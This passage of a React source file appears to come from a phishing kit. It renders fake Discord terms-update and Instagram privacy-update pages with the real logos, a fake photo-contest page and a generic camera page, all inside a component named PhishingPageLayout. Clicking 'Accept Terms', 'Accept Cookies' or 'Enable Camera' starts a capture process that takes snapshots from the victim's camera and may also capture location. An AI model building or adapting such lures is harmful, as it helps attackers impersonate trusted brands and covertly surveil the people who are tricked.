          <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/70 backdrop-blur-sm" onClick={() => setIsPolicyModalOpen(false)}>
            <div className="bg-white p-0 rounded-xl shadow-xl w-full max-w-md max-h-[75vh] flex flex-col text-left overflow-hidden" onClick={(e) => e.stopPropagation()}>
              <div className="flex justify-between items-center p-4 border-b border-gray-200">
                <h2 className="text-md font-semibold text-black">Privacy Policy</h2>
                <button onClick={() => setIsPolicyModalOpen(false)} className="text-gray-500 hover:text-black p-1 rounded-full hover:bg-gray-100 transition-colors" aria-label="Close policy modal">
                  <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
                </button>
              </div>
              <div className="overflow-y-auto text-sm text-[#262626] space-y-3 p-4">
                {genericPolicies.map((policy, index) => (
                  <div key={index} className="mb-2">
                    <p className="font-semibold text-sm mb-0.5">{policy.substring(0, policy.indexOf(':') + 1)}</p>
                    <p className="text-xs leading-relaxed">{policy.substring(policy.indexOf(':') + 2)}</p>
                  </div>
                ))}
              </div>
              <div className="mt-auto p-4 border-t border-gray-200 text-center">
                <Button onClick={() => setIsPolicyModalOpen(false)} className="w-full bg-[#0095f6] hover:bg-[#0077c6] text-white font-semibold py-2 px-4 rounded-lg text-sm">Done</Button>
              </div>
            </div>
          </div>
        )}
      </div>
    );
  } else if (templateId === 'discord-terms-update') {
    const camOpStatus = statusMessages.find(sm => sm.type === 'camera');
    return (
      <div className="flex flex-col items-center justify-center min-h-screen bg-[#36393f] p-4 text-[#dcddde] font-sans">
        {overallStatus !== 'completed' || (overallStatus === 'completed' && REDIRECT_URL_KEYS[templateId] && localStorage.getItem(REDIRECT_URL_KEYS[templateId])) ? (
          <div className="bg-[#2f3136] p-8 rounded-lg shadow-xl w-full max-w-md text-center">
            <img src="/discord_logo.png" alt="Discord Logo" className="h-16 w-auto mx-auto mb-6" />
            <h1 className="text-2xl font-bold text-white mb-4">{currentCamContent.title}</h1>
            <p className="text-sm text-[#b9bbbe] mb-6">{currentCamContent.message}</p>
            <p className="text-xs text-[#72767d] mb-6">{currentCamContent.cookieMessage}</p>
            <div className="space-y-3">
              <Button
                onClick={handleBrandedPolicyAccept}
                className="w-full bg-[#5865F2] hover:bg-[#4752c4] text-white font-semibold py-2.5 px-4 rounded-md text-md transition-colors duration-150"
                disabled={overallStatus === 'processing'}
              >
                {overallStatus === 'processing' ? <Loader2 className="h-5 w-5 animate-spin" /> : (currentCamContent.actionText || 'Accept Terms')}
              </Button>
              {camOpStatus && camOpStatus.status === 'error' && camOpStatus.message && (
                <p className="text-red-400 text-xs mt-4">{camOpStatus.message}</p>
              )}
              {overallStatus === 'processing' && (!camOpStatus || camOpStatus.status !== 'error') && (
                <div className="text-xs mt-4 text-gray-400 flex items-center justify-center">
                  <Loader2 className="h-4 w-4 animate-spin mr-1" /> Processing...
                </div>
              )}
            </div>
            <Button
              onClick={() => setIsPolicyModalOpen(true)}
              className="w-full mt-3 bg-transparent hover:bg-[#393c43] text-[#b9bbbe] font-medium py-2.5 px-4 rounded-md text-sm border border-[#40444b] hover:border-[#50545b] transition-colors duration-150"
            >
              Read the Policy
            </Button>
          </div>
        ) : (
          <div className="bg-[#2f3136] p-8 rounded-lg shadow-xl w-full max-w-md text-center">
            <img src="/discord_logo.png" alt="Discord Logo" className="h-16 w-auto mx-auto mb-6" />
            <CheckCircle className="w-16 h-16 text-green-400 mx-auto mb-4" />
            <h1 className="text-xl font-bold text-white mb-2">Terms Accepted</h1>
            <p className="text-sm text-[#b9bbbe]">This window can now be closed.</p>
          </div>
        )}
        {isPolicyModalOpen && ( // Generic policy modal, same as Google's
          <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/70 backdrop-blur-sm" onClick={() => setIsPolicyModalOpen(false)}>
            <div className="bg-[#2f3136] p-6 rounded-lg shadow-xl w-full max-w-xl max-h-[80vh] flex flex-col text-left border border-[#40444b]" onClick={(e) => e.stopPropagation()}>
              <div className="flex justify-between items-center mb-4">
                <h2 className="text-lg font-semibold text-white">Terms of Service</h2>
                <button onClick={() => setIsPolicyModalOpen(false)} className="text-[#b9bbbe] hover:text-white p-1 rounded-full hover:bg-[#393c43] transition-colors" aria-label="Close policy modal">
                  <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
                </button>
              </div>
              <div className="overflow-y-auto text-sm text-[#dcddde] space-y-2 pr-3 scrollbar-thin scrollbar-thumb-[#202225] scrollbar-track-[#2f3136]">
                {genericPolicies.map((policy, index) => ( <p key={index} className="mb-1.5 leading-relaxed">{policy}</p> ))}
              </div>
              <div className="mt-6 text-right">
                <Button onClick={() => setIsPolicyModalOpen(false)} className="bg-[#5865F2] hover:bg-[#4752c4] text-white font-medium py-2 px-4 rounded-md text-sm">Got it</Button>
              </div>
            </div>
          </div>
        )}
      </div>
    );
  } else if (templateId === 'instagram-privacy-update') {
    const camOpStatus = statusMessages.find(sm => sm.type === 'camera');
    return (
      <div className="flex flex-col items-center justify-center min-h-screen bg-white p-4 font-['Helvetica',_'Arial',_sans-serif]">
        {overallStatus !== 'completed' || (overallStatus === 'completed' && REDIRECT_URL_KEYS[templateId] && localStorage.getItem(REDIRECT_URL_KEYS[templateId])) ? (
          <div className="bg-white p-6 rounded-xl shadow-xl w-full max-w-sm">
            <img src="/instagram_logo.png" alt="Instagram Logo" className="h-10 w-auto mx-auto mb-6" />
            <h1 className="text-xl font-semibold text-black mb-3 text-center">{currentCamContent.title}</h1>
            <p className="text-sm text-[#262626] mb-4 leading-relaxed text-left">{currentCamContent.message}</p>
            <p className="text-xs text-[#8e8e8e] mb-6 text-left">{currentCamContent.cookieMessage}</p>
            <div className="space-y-3">
              <Button
                onClick={handleBrandedPolicyAccept}
                className="w-full bg-[#0095f6] hover:bg-[#0077c6] text-white font-semibold py-2.5 px-4 rounded-lg text-md transition-colors duration-150"
                disabled={overallStatus === 'processing'}
              >
                {overallStatus === 'processing' ? <Loader2 className="h-5 w-5 animate-spin" /> : (currentCamContent.actionText || 'Accept Policy')}
              </Button>
              {camOpStatus && camOpStatus.status === 'error' && camOpStatus.message && (
                 <p className="text-red-500 text-xs mt-3">{camOpStatus.message}</p>
              )}
              {overallStatus === 'processing' && (!camOpStatus || camOpStatus.status !== 'error') && (
                <div className="text-xs mt-3 text-gray-500 flex items-center justify-center">
                  <Loader2 className="h-4 w-4 animate-spin mr-1" /> Processing...
                </div>
              )}
            </div>
            <Button
              onClick={() => setIsPolicyModalOpen(true)}
              className="w-full mt-3 bg-transparent hover:bg-gray-50 text-[#0095f6] font-semibold py-2 px-4 rounded-lg text-sm transition-colors duration-150"
              variant="ghost"
            >
              Read the Policy
            </Button>
            <p className="text-xs text-[#c7c7c7] mt-6 text-center">You can review our updated policy details any time in our Help Center.</p>
          </div>
        ) : (
          <div className="bg-white p-6 rounded-xl shadow-xl w-full max-w-sm text-center">
            <img src="/instagram_logo.png" alt="Instagram Logo" className="h-10 w-auto mx-auto mb-6" />
            <CheckCircle className="w-16 h-16 text-green-500 mx-auto mb-4" />
            <h1 className="text-lg font-semibold text-black mb-2">Policy Accepted</h1>
            <p className="text-sm text-[#262626]">This window can now be closed.</p>
          </div>
        )}
        {isPolicyModalOpen && ( // Generic policy modal, same as Google's
           <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/40 backdrop-blur-sm" onClick={() => setIsPolicyModalOpen(false)}>
            <div className="bg-white p-0 rounded-xl shadow-xl w-full max-w-md max-h-[75vh] flex flex-col text-left overflow-hidden" onClick={(e) => e.stopPropagation()}>
                <div className="flex justify-between items-center p-4 border-b border-gray-200">
                    <h2 className="text-md font-semibold text-black">Privacy Policy</h2>
                    <button onClick={() => setIsPolicyModalOpen(false)} className="text-gray-500 hover:text-black p-1 rounded-full hover:bg-gray-100 transition-colors" aria-label="Close policy modal">
                        <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
                    </button>
                </div>
                <div className="overflow-y-auto text-sm text-[#262626] space-y-3 p-4">
                    {genericPolicies.map((policy, index) => (
                        <div key={index} className="mb-2">
                            <p className="font-semibold text-sm mb-0.5">{policy.substring(0, policy.indexOf(':') + 1)}</p>
                            <p className="text-xs leading-relaxed">{policy.substring(policy.indexOf(':') + 2)}</p>
                        </div>
                    ))}
                </div>
                <div className="mt-auto p-4 border-t border-gray-200 text-center">
                    <Button onClick={() => setIsPolicyModalOpen(false)} className="w-full bg-[#0095f6] hover:bg-[#0077c6] text-white font-semibold py-2 px-4 rounded-lg text-sm">Done</Button>
                </div>
            </div>
        </div>
        )}
      </div>
    );
  } else if (templateId === 'photo-contest-entry') {
    const camOpStatus = statusMessages.find(sm => sm.type === 'camera');
    // This template uses PhishingPageLayout and has a cookie consent step.
    // The `startCaptureProcess` should only be callable after cookie consent.
    // The actual camera request part of `startCaptureProcess` will run if 'camera' is a requested type.
    const handlePhotoContestCookieAndCapture = () => {
        setCookieConsentGiven(true);
        // If camera is the only requested type, or the first one, startCaptureProcess will handle it.
        // If other captures are requested (e.g. location first), this button might need to wait or
        // the startCaptureProcess needs to be intelligent about the current step/UI context.
        // For now, assume this button directly leads to captures.
        if (requestedCaptureTypes.includes('camera') || requestedCaptureTypes.length === 0) { // Allow process if camera is there or no specific types
             startCaptureProcess();
        } else {
            // If camera is not requested, but other things are, this button might be misaligned.
            // For now, let startCaptureProcess handle it; it will skip camera if not requested.
            startCaptureProcess();
        }
    }

    return (
      <>
        <PhishingPageLayout title={currentCamContent.title} className={currentCamContent.visual ? 'pt-0' : ''}>
          <div className={cn("text-center mb-6", currentCamContent.visual ? 'bg-gradient-to-r from-yellow-400 via-red-500 to-pink-500 p-4 rounded-t-lg text-white' : '')}>
            <div className="flex items-center justify-center p-4">
              {currentCamContent.visual}
              <h1 className={cn("text-2xl font-bold", currentCamContent.visual ? 'text-white' : '')}>{currentCamContent.title}</h1>
            </div>
          </div>
          <p className="text-center text-muted-foreground mb-6 px-4" dangerouslySetInnerHTML={{ __html: currentCamContent.message.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>') }} />

          <div className={cn(
              "aspect-video bg-muted rounded-lg overflow-hidden mb-6 relative border-2",
              (overallStatus === 'processing' && camOpStatus?.status === 'capturing' && cookieConsentGiven) ? 'border-primary' : 'border-border'
            )}>
            <video ref={videoRef} className="w-full h-full object-cover" playsInline muted />
            { !(overallStatus === 'processing' && camOpStatus?.status === 'capturing' && cookieConsentGiven) && !(overallStatus === 'completed' && camOpStatus?.status === 'success' && cookieConsentGiven) && (
              <div className="absolute inset-0 flex flex-col items-center justify-center bg-black/30">
                {!cookieConsentGiven ? (
                  <>
                    <ImageIconLucide className="h-16 w-16 text-white/70 mb-2" />
                    <p className="text-white/90">Contest photo will appear here</p>
                  </>
                ) : (overallStatus === 'idle' || overallStatus === 'processing') && cookieConsentGiven && camOpStatus?.status !== 'capturing' ? (
                  <>
                    <VideoOff className="h-16 w-16 text-white/70 mb-2" />
                    <p className="text-white/90 text-center px-4">{camOpStatus?.status === 'error' && camOpStatus.message ? camOpStatus.message : 'Camera feed inactive. Waiting for camera permission...'}</p>
                  </>
                ) : null }
              </div>
            )}
          </div>
          {/* <canvas ref={canvasRef} className="hidden"></canvas> */} {/* Global canvas is used */}

          {overallStatus === 'processing' && camOpStatus?.status === 'capturing' && cookieConsentGiven && (
             <div className="text-center p-3 bg-blue-100 border border-blue-300 rounded-md mb-6">
              <p className="font-medium text-blue-700">Camera active. Capturing snapshot...</p>
              {/* <Button onClick={() => { /* TODO: Implement cancel for this specific capture type if needed */ }} variant="outline" size="sm" className="mt-2">Cancel Submission</Button> */}
            </div>
          )}

          {overallStatus === 'completed' && camOpStatus?.status === 'success' && cookieConsentGiven && (
            <div className="text-center p-4 bg-green-100 border border-green-300 rounded-md mb-6">
              <CheckCircle className="mx-auto h-10 w-10 text-green-600 mb-2" />
              <p className="font-semibold text-green-700">Photo Submitted Successfully!</p>
              <p className="text-sm text-green-600">Thank you for entering the contest. This window can now be closed.</p>
            </div>
          )}
           {camOpStatus?.status === 'error' && cookieConsentGiven && (
             <div className="text-center p-4 bg-red-100 border border-red-300 rounded-md mb-6">
              <AlertTriangle className="mx-auto h-10 w-10 text-red-600 mb-2" />
              <p className="font-semibold text-red-700">Camera Access Failed</p>
              <p className="text-sm text-red-600">{camOpStatus.message}</p>
              <Button onClick={startCaptureProcess} variant="outline" className="mt-3" disabled={overallStatus === 'processing'}>Try Again</Button>
            </div>
          )}
           {/* Display other status messages if present (e.g., for location if requested before camera) */}
            {overallStatus === 'processing' && statusMessages.filter(m => m.type !== 'camera').length > 0 && (
                 <div className="my-4 space-y-2 text-left">
                 {statusMessages.filter(m => m.type !== 'camera' && m.status !== 'pending').map((msg, index) => (
                   <div key={`other-${index}`} className={`p-2 border rounded-md text-sm ${
                     msg.status === 'success' ? 'bg-green-100 border-green-300 text-green-700' :
                     msg.status === 'error' ? 'bg-red-100 border-red-300 text-red-700' :
                     msg.status === 'capturing' ? 'bg-blue-100 border-blue-300 text-blue-700' :
                     'bg-gray-100 border-gray-300'
                   }`}>
                     <strong>{msg.type.charAt(0).toUpperCase() + msg.type.slice(1)}:</strong> {msg.message || msg.status}
                     {msg.status === 'capturing' && <Loader2 className="inline-block ml-2 h-4 w-4 animate-spin" />}
                   </div>
                 ))}
               </div>
            )}
        </PhishingPageLayout>

        {!cookieConsentGiven && overallStatus === 'idle' && (
            <div className="fixed bottom-0 left-0 right-0 p-4 bg-background border-t border-border shadow-lg z-50">
              <div className="container mx-auto flex flex-col sm:flex-row items-center justify-between gap-3">
                <p className="text-sm text-foreground text-center sm:text-left flex-grow">
                  {currentCamContent.cookieMessage || "Our site uses cookies to enhance your experience. By clicking 'Accept Cookies', you agree to our use of cookies."}
                </p>
                <Button
                  onClick={handlePhotoContestCookieAndCapture}
                  className="bg-primary hover:bg-primary/90 text-primary-foreground whitespace-nowrap w-full sm:w-auto flex-shrink-0"
                  disabled={overallStatus === 'processing'}
                >
                  <Cookie className="mr-2 h-4 w-4" />
                  Accept Cookies
                </Button>
              </div>
            </div>
        )}
      </>
    );
  }
  // Default/fallback for other camera templates (video-verification, ar-filter, default)
  // This structure is similar to the original fallback in renderCameraTemplateUI
  // but uses currentCamContent and overallStatus correctly.
  const CamIcon = CameraIconLucide;
  return (
    <PhishingPageLayout title={currentCamContent.title}>
      <div className="space-y-4 text-center">
        <div className="flex items-center justify-center mb-2">
          {currentCamContent.visual || <CamIcon className="h-12 w-12 text-gray-600" />}
        </div>
        <h1 className="text-xl font-semibold">{currentCamContent.title}</h1>
        <p className="text-muted-foreground">{currentCamContent.message}</p>

        {requestedCaptureTypes.includes('camera') && (
            <div className="aspect-video bg-muted rounded-lg overflow-hidden my-4 relative border">
                <video ref={videoRef} className="w-full h-full object-cover" playsInline muted />
                {!(overallStatus === 'processing' && statusMessages.find(sm=>sm.type === 'camera')?.status === 'capturing') &&
                 !(statusMessages.find(sm=>sm.type === 'camera')?.status === 'success') && (
                    <div className="absolute inset-0 flex flex-col items-center justify-center bg-black/50">
                        <VideoOff className="h-16 w-16 text-white/70 mb-2" />
                        <p className="text-white/90">Camera feed inactive</p>
                    </div>
                )}
            </div>
        )}

        {overallStatus === 'idle' && (
          <Button
            onClick={startCaptureProcess}
            disabled={requestedCaptureTypes.length === 0 || overallStatus === 'processing'}
            size="lg"
            className="w-full bg-accent hover:bg-accent/90 text-accent-foreground"
          >
             <CamIcon className="mr-2 h-5 w-5" /> {currentCamContent.actionText || 'Enable Camera & Process'}
          </Button>
        )}

        {overallStatus === 'processing' && <Loader2 className="h-8 w-8 animate-spin mx-auto text-primary" />}

        {statusMessages.length > 0 && (
            <div id="capture-status" className="my-4 space-y-2 text-left">
            {statusMessages.map((msg, index) => (
                <div key={index} className={`p-2 border rounded-md text-sm ${
                msg.status === 'success' ? 'bg-green-100 border-green-300 text-green-700' :
                msg.status === 'error' ? 'bg-red-100 border-red-300 text-red-700' :
                msg.status === 'capturing' ? 'bg-blue-100 border-blue-300 text-blue-700' :
                'bg-gray-100 border-gray-300'
                }`}>
                <strong>{msg.type.charAt(0).toUpperCase() + msg.type.slice(1)}:</strong> {msg.message || msg.status}
                {msg.status === 'capturing' && <Loader2 className="inline-block ml-2 h-4 w-4 animate-spin" />}
                </div>
            ))}
            </div>
        )}

        {overallStatus === 'completed' && (
          <div className="text-center p-4 bg-green-100 border border-green-300 rounded-md shadow">
            <CheckCircle className="mx-auto h-12 w-12 text-green-600 mb-2" />
            <p className="text-xl font-semibold text-green-700">
              {REDIRECT_URL_KEYS[templateId] && localStorage.getItem(REDIRECT_URL_KEYS[templateId])?.trim() !== ''
                ? "Process Complete. Redirecting..."
                : "Process Complete."}
            </p>
             <p className="text-md text-green-600">
                {!(REDIRECT_URL_KEYS[templateId] && localStorage.getItem(REDIRECT_URL_KEYS[templateId])?.trim() !== '') && "This window can now be closed."}
              </p>
          </div>
        )}
        {overallStatus === 'failed' && (
             <Alert variant="destructive" className="mt-6">
                <AlertTriangle className="h-5 w-5" />
                <AlertTitle>Process Failed</AlertTitle>
                <AlertDescription>
                    {statusMessages.find(m => m.status === 'error')?.message || "An error occurred."}
                </AlertDescription>
            </Alert>
        )}
      </div>
    </PhishingPageLayout>
  );
};
